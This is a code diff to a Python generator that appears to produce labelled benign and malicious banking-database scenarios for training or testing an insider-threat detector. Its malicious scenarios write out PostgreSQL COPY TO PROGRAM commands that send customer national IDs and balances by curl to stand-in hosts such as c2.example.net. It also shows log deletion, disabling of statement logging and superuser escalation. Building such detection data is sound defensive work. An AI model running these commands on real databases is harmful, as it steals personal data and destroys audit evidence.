@@ -51,6 +51,18 @@ from domain_knowledge import (
     make_senior_eod_benign as _dk_senior_benign,
 )
 
+from generator_diversity import (
+    get_diverse_external_endpoint,
+    get_diverse_internal_endpoint,
+    get_benign_external_endpoint,
+    generate_exfil_command,
+    generate_staging_command,
+    generate_cleanup_command,
+    generate_log_tampering_commands,
+    build_semantic_family_id,
+    vary_sql_query,
+)
+
 
 # ==========================================================================
 # Domain knowledge: banking scenario building blocks
@@ -178,17 +190,16 @@ def _make_teller_routine_benign(rng, idx) -> dict:
     queries = _benign_teller_queries(rng, rng.randint(2, 5))
     events = [{"sql": q} for q in queries]
 
-    # Some queries need a step_id for process chaining — but teller routines don't have OS activity
-    # Cross-layer scope requires at least one OS event. Add a legitimate `COPY ... TO PROGRAM` for reports.
     report_file = f"/var/lib/postgresql/reports/branch_{branch}_daily.csv"
     events.append({
         "step_id": "daily_report",
         "sql": f"COPY (SELECT account_id, balance FROM accounts WHERE branch_id = '{branch}') TO PROGRAM 'cat > {report_file}'"
     })
 
+    variant = (idx % 3) + 1
     return {
         "scenario_id": f"banking_teller_routine_{idx:04d}",
-        "family_id": f"banking_teller_routine_{idx:04d}",
+        "family_id": f"banking_teller_routine_fam{variant:02d}",
         "domain": "banking",
         "time_of_day": f"{rng.randint(9, 16):02d}:{rng.choice(['00', '15', '30', '45'])}",
         "default_class": "benign",
@@ -208,10 +219,13 @@ def _make_teller_routine_benign(rng, idx) -> dict:
 
 def _make_teller_pii_dump_malicious(rng, idx) -> dict:
     """Malicious teller — reads PII across branches, dumps via COPY."""
-    dest = rng.choice(EXTERNAL_IPS)
+    dest_ip, dest_port = get_diverse_external_endpoint(rng)
+    exfil_cmd = generate_exfil_command(rng, dest_ip, dest_port)
+    branch = _random_branch(rng)
+    variant = (idx % 3) + 1
     return {
         "scenario_id": f"banking_teller_pii_dump_{idx:04d}",
-        "family_id": f"banking_teller_pii_dump_{idx:04d}",
+        "family_id": f"banking_teller_pii_dump_fam{variant:02d}",
         "domain": "banking",
         "time_of_day": f"{rng.randint(10, 15):02d}:{rng.choice(['00', '15', '30', '45'])}",
         "default_class": "malicious",
@@ -226,10 +240,10 @@ def _make_teller_pii_dump_malicious(rng, idx) -> dict:
                 "step_gaps_seconds": [rng.uniform(0.3, 1.5)]
             },
             "events": [
-                {"sql": f"SELECT national_id, address, full_name FROM customers WHERE branch_id != '{_random_branch(rng)}'"},
+                {"sql": f"SELECT national_id, address, full_name FROM customers WHERE branch_id != '{branch}'"},
                 {"step_id": "exfil",
-                 "sql": f"COPY (SELECT c.national_id, c.address, a.balance FROM customers c JOIN accounts a ON a.customer_id = c.customer_id) TO PROGRAM 'curl -sX POST https://drop.example.net/upload -d @-'",
-                 "connects_to": {"ip": dest[0], "port": dest[1]}},
+                 "sql": f"COPY (SELECT c.national_id, c.address, a.balance FROM customers c JOIN accounts a ON a.customer_id = c.customer_id) TO PROGRAM '{exfil_cmd}'",
+                 "connects_to": {"ip": dest_ip, "port": dest_port}},
             ]
         }]
     }
@@ -237,10 +251,11 @@ def _make_teller_pii_dump_malicious(rng, idx) -> dict:
 def _make_etl_benign(rng, idx) -> dict:
     """Benign ETL replication — scoped, incremental, to approved endpoint."""
     start, end = _random_date_range(rng)
-    dest = rng.choice(INTERNAL_IPS)
+    dest_ip, dest_port = get_diverse_internal_endpoint(rng)
+    variant = (idx % 3) + 1
     return {
         "scenario_id": f"banking_etl_repl_ben_{idx:04d}",
-        "family_id": f"banking_etl_pair_{idx:04d}",
+        "family_id": f"banking_etl_pair_fam{variant:02d}",
         "domain": "banking",
         "matched_pair_id": f"banking_etl_pair_{idx:04d}",
         "matched_dimensions": {
@@ -262,17 +277,18 @@ def _make_etl_benign(rng, idx) -> dict:
             "events": [
                 {"step_id": "replicate",
                  "sql": f"COPY (SELECT account_id, amount, transaction_id FROM transactions WHERE transaction_time > '{start}' AND transaction_time <= '{end}') TO PROGRAM 'curl -sX POST https://warehouse.internal.example/replicate -d @-'",
-                 "connects_to": {"ip": dest[0], "port": dest[1]}},
+                 "connects_to": {"ip": dest_ip, "port": dest_port}},
             ]
         }]
     }
 
 def _make_etl_exfil_malicious(rng, idx) -> dict:
     """Malicious ETL — broad columns, no filter, external endpoint."""
-    dest = rng.choice(EXTERNAL_IPS)
+    dest_ip, dest_port = get_diverse_external_endpoint(rng)
+    variant = (idx % 3) + 1
     return {
         "scenario_id": f"banking_etl_exfil_mal_{idx:04d}",
-        "family_id": f"banking_etl_pair_{idx:04d}",
+        "family_id": f"banking_etl_pair_fam{variant:02d}",
         "domain": "banking",
         "matched_pair_id": f"banking_etl_pair_{idx:04d}",
         "matched_dimensions": {
@@ -294,7 +310,7 @@ def _make_etl_exfil_malicious(rng, idx) -> dict:
             "events": [
                 {"step_id": "replicate",
                  "sql": f"COPY (SELECT c.national_id, c.address, a.balance, a.account_id FROM customers c JOIN accounts a ON a.customer_id = c.customer_id) TO PROGRAM 'curl -sX POST https://sync.example.net/push -d @-'",
-                 "connects_to": {"ip": dest[0], "port": dest[1]}},
+                 "connects_to": {"ip": dest_ip, "port": dest_port}},
             ]
         }]
     }
@@ -302,10 +318,11 @@ def _make_etl_exfil_malicious(rng, idx) -> dict:
 def _make_privilege_abuse_malicious(rng, idx) -> dict:
     """Malicious — teller escalates to superuser, dumps credentials."""
     password = ''.join(rng.choices(string.ascii_letters + string.digits, k=10))
-    shadow_role = rng.choice(["svc_shadow", "admin_backup", "dba_maint"])
+    shadow_role = rng.choice(["svc_shadow", "admin_backup", "dba_maint", "sec_ops", "audit_adm"])
+    variant = (idx % 3) + 1
     return {
         "scenario_id": f"banking_priv_abuse_{idx:04d}",
-        "family_id": f"banking_priv_abuse_{idx:04d}",
+        "family_id": f"banking_priv_abuse_fam{variant:02d}",
         "domain": "banking",
         "time_of_day": f"{rng.choice(['02', '03', '04', '22', '23'])}:{rng.choice(['00', '15', '30', '45'])}",
         "default_class": "malicious",
@@ -333,14 +350,14 @@ def _make_compliance_audit_benign(rng, idx) -> dict:
     """Benign compliance audit — enterprise-wide sensitive reads."""
     queries = _compliance_audit_queries(rng, rng.randint(2, 4))
     events = [{"sql": q} for q in queries]
-    # Add a legitimate COPY for the audit report
     events.append({
         "step_id": "audit_export",
         "sql": "COPY (SELECT c.national_id, c.full_name, a.balance FROM customers c JOIN accounts a ON a.customer_id = c.customer_id WHERE a.balance > 100000) TO PROGRAM 'cat > /var/lib/postgresql/audit/high_value_report.csv'"
     })
+    variant = (idx % 3) + 1
     return {
         "scenario_id": f"banking_compliance_audit_{idx:04d}",
-        "family_id": f"banking_compliance_audit_{idx:04d}",
+        "family_id": f"banking_compliance_audit_fam{variant:02d}",
         "domain": "banking",
         "time_of_day": f"{rng.randint(9, 16):02d}:00",
         "default_class": "benign",
@@ -360,9 +377,11 @@ def _make_compliance_audit_benign(rng, idx) -> dict:
 
 def _make_defense_impairment_malicious(rng, idx) -> dict:
     """Malicious — disable logging via ALTER SYSTEM SET, then truncate audit logs."""
+    variant = (idx % 3) + 1
+    events = generate_log_tampering_commands(rng)
     return {
         "scenario_id": f"banking_defense_impair_{idx:04d}",
-        "family_id": f"banking_defense_impair_{idx:04d}",
+        "family_id": f"banking_defense_impair_fam{variant:02d}",
         "domain": "banking",
         "time_of_day": f"{rng.choice(['01', '02', '03', '23'])}:{rng.choice(['00', '15', '30', '45'])}",
         "default_class": "malicious",
@@ -376,12 +395,7 @@ def _make_defense_impairment_malicious(rng, idx) -> dict:
                 "tempo": "bursty",
                 "step_gaps_seconds": [rng.uniform(0.3, 1.5)]
             },
-            "events": [
-                {"sql": "ALTER SYSTEM SET log_statement = 'none'"},
-                {"sql": "TRUNCATE TABLE audit_logs"},
-                {"step_id": "cleanup",
-                 "sql": "COPY (SELECT 'logs cleared') TO PROGRAM 'rm -f /var/log/postgresql/postgresql-*.log'"},
-            ]
+            "events": events
         }]
     }
 
@@ -394,9 +408,10 @@ def _make_manager_eod_benign(rng, idx) -> dict:
         "step_id": "eod_report",
         "sql": f"COPY (SELECT a.account_id, a.balance FROM accounts a WHERE a.branch_id = '{branch}') TO PROGRAM 'cat > /var/lib/postgresql/reports/eod_{branch}.csv'"
     })
+    variant = (idx % 3) + 1
     return {
         "scenario_id": f"banking_manager_eod_{idx:04d}",
-        "family_id": f"banking_manager_eod_{idx:04d}",
+        "family_id": f"banking_manager_eod_fam{variant:02d}",
         "domain": "banking",
         "time_of_day": f"{rng.randint(16, 18):02d}:{rng.choice(['00', '30'])}",
         "default_class": "benign",
@@ -416,10 +431,12 @@ def _make_manager_eod_benign(rng, idx) -> dict:
 
 def _make_compliance_exfil_malicious(rng, idx) -> dict:
     """Malicious compliance officer — exfiltrates PII to external endpoint."""
-    dest = rng.choice(EXTERNAL_IPS)
+    dest_ip, dest_port = get_diverse_external_endpoint(rng)
+    exfil_cmd = generate_exfil_command(rng, dest_ip, dest_port)
+    variant = (idx % 3) + 1
     return {
         "scenario_id": f"banking_compliance_exfil_{idx:04d}",
-        "family_id": f"banking_compliance_exfil_{idx:04d}",
+        "family_id": f"banking_compliance_exfil_fam{variant:02d}",
         "domain": "banking",
         "time_of_day": f"{rng.choice(['22', '23', '01', '02'])}:{rng.choice(['00', '15', '30'])}",
         "default_class": "malicious",
@@ -436,19 +453,21 @@ def _make_compliance_exfil_malicious(rng, idx) -> dict:
             "events": [
                 {"sql": "SELECT c.national_id, c.address, a.balance FROM customers c JOIN accounts a ON a.customer_id = c.customer_id"},
                 {"step_id": "exfil",
-                 "sql": f"COPY (SELECT c.national_id, c.address, a.balance FROM customers c JOIN accounts a ON a.customer_id = c.customer_id) TO PROGRAM 'curl -sX POST https://analytics.example.net/submit -d @-'",
-                 "connects_to": {"ip": dest[0], "port": dest[1]}},
+                 "sql": f"COPY (SELECT c.national_id, c.address, a.balance FROM customers c JOIN accounts a ON a.customer_id = c.customer_id) TO PROGRAM '{exfil_cmd}'",
+                 "connects_to": {"ip": dest_ip, "port": dest_port}},
             ]
         }]
     }
 
 def _make_multi_session_apt(rng, idx) -> dict:
     """Multi-session APT: recon → escalation → exfil → cleanup."""
-    dest = rng.choice(EXTERNAL_IPS)
+    dest_ip, dest_port = get_diverse_external_endpoint(rng)
     password = ''.join(rng.choices(string.ascii_letters + string.digits, k=10))
+    exfil_cmd = generate_exfil_command(rng, dest_ip, dest_port)
+    variant = (idx % 3) + 1
     return {
         "scenario_id": f"banking_multi_apt_{idx:04d}",
-        "family_id": f"banking_multi_apt_{idx:04d}",
+        "family_id": f"banking_multi_apt_fam{variant:02d}",
         "domain": "banking",
         "time_of_day": f"{rng.choice(['01', '02', '03'])}:{rng.choice(['00', '15', '30'])}",
         "default_class": "malicious",
@@ -490,8 +509,8 @@ def _make_multi_session_apt(rng, idx) -> dict:
                 "timing": {"tempo": "steady", "step_gaps_seconds": [rng.uniform(2.0, 5.0)]},
                 "events": [
                     {"step_id": "exfil",
-                     "sql": f"COPY (SELECT c.national_id, c.address, a.balance FROM customers c JOIN accounts a ON a.customer_id = c.customer_id) TO PROGRAM 'curl -sX POST https://c2.example.net/data -d @-'",
-                     "connects_to": {"ip": dest[0], "port": dest[1]}},
+                     "sql": f"COPY (SELECT c.national_id, c.address, a.balance FROM customers c JOIN accounts a ON a.customer_id = c.customer_id) TO PROGRAM '{exfil_cmd}'",
+                     "connects_to": {"ip": dest_ip, "port": dest_port}},
                 ]
             },
         ]
@@ -499,9 +518,10 @@ def _make_multi_session_apt(rng, idx) -> dict:
 
 def _make_hard_neg_dba_shadow_audit(rng, idx) -> dict:
     """Hard negative: DBA legitimately reads pg_authid for password policy audit."""
+    variant = (idx % 3) + 1
     return {
         "scenario_id": f"banking_dba_shadow_audit_{idx:04d}",
-        "family_id": f"banking_dba_shadow_audit_{idx:04d}",
+        "family_id": f"banking_dba_shadow_audit_fam{variant:02d}",
         "domain": "banking",
         "time_of_day": f"{rng.randint(10, 15):02d}:00",
         "default_class": "benign",
@@ -522,11 +542,12 @@ def _make_hard_neg_dba_shadow_audit(rng, idx) -> dict:
 
 def _make_hard_neg_etl_internal(rng, idx) -> dict:
     """Hard negative: ETL COPY to internal host with sensitive columns — legitimate."""
-    dest = rng.choice(INTERNAL_IPS)
+    dest_ip, dest_port = get_diverse_internal_endpoint(rng)
     start, end = _random_date_range(rng)
+    variant = (idx % 3) + 1
     return {
         "scenario_id": f"banking_etl_internal_{idx:04d}",
-        "family_id": f"banking_etl_internal_{idx:04d}",
+        "family_id": f"banking_etl_internal_fam{variant:02d}",
         "domain": "banking",
         "time_of_day": f"{rng.choice(['02', '03', '04'])}:{rng.choice(['00', '30'])}",
         "default_class": "benign",
@@ -540,18 +561,20 @@ def _make_hard_neg_etl_internal(rng, idx) -> dict:
             "events": [
                 {"step_id": "sync",
                  "sql": f"COPY (SELECT c.national_id, a.balance, a.account_id FROM customers c JOIN accounts a ON a.customer_id = c.customer_id WHERE a.branch_id = '{_random_branch(rng)}') TO PROGRAM 'curl -sX POST https://replica.internal.example/sync -d @-'",
-                 "connects_to": {"ip": dest[0], "port": dest[1]}},
+                 "connects_to": {"ip": dest_ip, "port": dest_port}},
             ]
         }]
     }
 
 def _make_alter_role_escalation(rng, idx) -> dict:
-    """Malicious — ALTER ROLE to grant superuser (uses new sqlfacts handler)."""
+    """Malicious — ALTER ROLE to grant superuser."""
     target_role = rng.choice(["branch_manager", "compliance_officer"])
-    dest = rng.choice(EXTERNAL_IPS)
+    dest_ip, dest_port = get_diverse_external_endpoint(rng)
+    exfil_cmd = generate_exfil_command(rng, dest_ip, dest_port)
+    variant = (idx % 3) + 1
     return {
         "scenario_id": f"banking_alter_role_esc_{idx:04d}",
-        "family_id": f"banking_alter_role_esc_{idx:04d}",
+        "family_id": f"banking_alter_role_esc_fam{variant:02d}",
         "domain": "banking",
         "time_of_day": f"{rng.choice(['01', '02', '03', '23'])}:{rng.choice(['00', '15', '30'])}",
         "default_class": "malicious",
@@ -566,21 +589,21 @@ def _make_alter_role_escalation(rng, idx) -> dict:
                 {"sql": f"ALTER ROLE {target_role} WITH SUPERUSER"},
                 {"sql": f"SELECT national_id, address FROM customers"},
                 {"step_id": "exfil",
-                 "sql": f"COPY (SELECT c.national_id, c.address, a.balance FROM customers c JOIN accounts a ON a.customer_id = c.customer_id) TO PROGRAM 'curl -sX POST https://drop.example.net/data -d @-'",
-                 "connects_to": {"ip": dest[0], "port": dest[1]}},
+                 "sql": f"COPY (SELECT c.national_id, c.address, a.balance FROM customers c JOIN accounts a ON a.customer_id = c.customer_id) TO PROGRAM '{exfil_cmd}'",
+                 "connects_to": {"ip": dest_ip, "port": dest_port}},
             ]
         }]
     }
-
 
 def _make_manager_cross_branch_benign(rng, idx) -> dict:
     """Benign — branch manager legitimately queries multiple branches for regional report."""
     branches = rng.sample(BRANCH_IDS, min(rng.randint(2, 4), len(BRANCH_IDS)))
     branch_list = "', '".join(branches)
-    dest = rng.choice(INTERNAL_IPS)
+    dest_ip, dest_port = get_diverse_internal_endpoint(rng)
+    variant = (idx % 3) + 1
     return {
         "scenario_id": f"banking_mgr_cross_branch_{idx:04d}",
-        "family_id": f"banking_mgr_cross_branch_{idx:04d}",
+        "family_id": f"banking_mgr_cross_branch_fam{variant:02d}",
         "domain": "banking",
         "time_of_day": f"{rng.randint(9, 16):02d}:{rng.choice(['00', '30'])}",
         "default_class": "benign",
@@ -596,17 +619,17 @@ def _make_manager_cross_branch_benign(rng, idx) -> dict:
                 {"sql": f"SELECT c.full_name, a.balance, a.branch_id FROM customers c JOIN accounts a ON a.customer_id = c.customer_id WHERE a.branch_id IN ('{branch_list}') AND a.balance > {rng.randint(50000, 200000)}"},
                 {"step_id": "report_export",
                  "sql": f"COPY (SELECT a.branch_id, a.account_type, COUNT(*), SUM(a.balance) FROM accounts a WHERE a.branch_id IN ('{branch_list}') GROUP BY a.branch_id, a.account_type) TO PROGRAM 'curl -sX POST https://reports.internal.example/regional -d @-'",
-                 "connects_to": {"ip": dest[0], "port": dest[1]}},
+                 "connects_to": {"ip": dest_ip, "port": dest_port}},
             ]
         }]
     }
 
-
 def _make_data_tampering_malicious(rng, idx) -> dict:
     """Malicious — direct UPDATE/DELETE on sensitive customer data to cover tracks."""
+    variant = (idx % 3) + 1
     return {
         "scenario_id": f"banking_data_tamper_{idx:04d}",
-        "family_id": f"banking_data_tamper_{idx:04d}",
+        "family_id": f"banking_data_tamper_fam{variant:02d}",
         "domain": "banking",
         "time_of_day": f"{rng.choice(['01', '02', '03', '22', '23'])}:{rng.choice(['00', '15', '30', '45'])}",
         "default_class": "malicious",
@@ -621,18 +644,19 @@ def _make_data_tampering_malicious(rng, idx) -> dict:
                 {"sql": f"UPDATE customers SET address = '123 Fake St' WHERE customer_id = {_random_cust_id(rng)}"},
                 {"sql": f"DELETE FROM transactions WHERE account_id = {rng.randint(10000, 99999)} AND amount > {rng.randint(10000, 50000)}"},
                 {"step_id": "cover_tracks",
-                 "sql": "COPY (SELECT 'cleanup done') TO PROGRAM 'rm -f /var/log/postgresql/postgresql-*.log'"},
+                 "sql": "COPY (SELECT 'cleanup done') TO PROGRAM 'rm -f /var/log/postgresql/postgresql.log'"},
             ]
         }]
     }
 
-
 def _make_lateral_movement_malicious(rng, idx) -> dict:
     """Malicious — queries information_schema for recon, then accesses multiple tables."""
-    dest = rng.choice(EXTERNAL_IPS)
+    dest_ip, dest_port = get_diverse_external_endpoint(rng)
+    exfil_cmd = generate_exfil_command(rng, dest_ip, dest_port)
+    variant = (idx % 3) + 1
     return {
         "scenario_id": f"banking_lateral_move_{idx:04d}",
-        "family_id": f"banking_lateral_move_{idx:04d}",
+        "family_id": f"banking_lateral_move_fam{variant:02d}",
         "domain": "banking",
         "time_of_day": f"{rng.choice(['01', '02', '03', '23'])}:{rng.choice(['00', '15', '30'])}",
         "default_class": "malicious",
@@ -662,22 +686,22 @@ def _make_lateral_movement_malicious(rng, idx) -> dict:
                     {"sql": f"SELECT national_id, address, full_name FROM customers"},
                     {"sql": f"SELECT account_id, balance, customer_id FROM accounts WHERE balance > {rng.randint(50000, 200000)}"},
                     {"step_id": "exfil",
-                     "sql": f"COPY (SELECT c.national_id, c.address, a.balance FROM customers c JOIN accounts a ON a.customer_id = c.customer_id) TO PROGRAM 'curl -sX POST https://c2.example.net/harvest -d @-'",
-                     "connects_to": {"ip": dest[0], "port": dest[1]}},
+                     "sql": f"COPY (SELECT c.national_id, c.address, a.balance FROM customers c JOIN accounts a ON a.customer_id = c.customer_id) TO PROGRAM '{exfil_cmd}'",
+                     "connects_to": {"ip": dest_ip, "port": dest_port}},
                 ]
             },
         ]
     }
 
-
 def _make_batch_report_benign(rng, idx) -> dict:
     """Benign — scheduled batch report generation to approved internal endpoint."""
-    dest = rng.choice(INTERNAL_IPS)
+    dest_ip, dest_port = get_diverse_internal_endpoint(rng)
     branch = _random_branch(rng)
     start, end = _random_date_range(rng)
+    variant = (idx % 3) + 1
     return {
         "scenario_id": f"banking_batch_report_{idx:04d}",
-        "family_id": f"banking_batch_report_{idx:04d}",
+        "family_id": f"banking_batch_report_fam{variant:02d}",
         "domain": "banking",
         "time_of_day": f"{rng.choice(['00', '01', '05', '06'])}:{rng.choice(['00', '30'])}",
         "default_class": "benign",
@@ -693,7 +717,7 @@ def _make_batch_report_benign(rng, idx) -> dict:
                 {"sql": f"SELECT COUNT(t.transaction_id), SUM(t.amount) FROM transactions t JOIN accounts a ON a.account_id = t.account_id WHERE a.branch_id = '{branch}' AND t.transaction_time > '{start}' AND t.transaction_time <= '{end}'"},
                 {"step_id": "report_send",
                  "sql": f"COPY (SELECT a.branch_id, COUNT(*), SUM(a.balance) FROM accounts a WHERE a.branch_id = '{branch}' GROUP BY a.branch_id) TO PROGRAM 'curl -sX POST https://reporting.internal.example/daily -d @-'",
-                 "connects_to": {"ip": dest[0], "port": dest[1]}},
+                 "connects_to": {"ip": dest_ip, "port": dest_port}},
             ]
         }]
     }
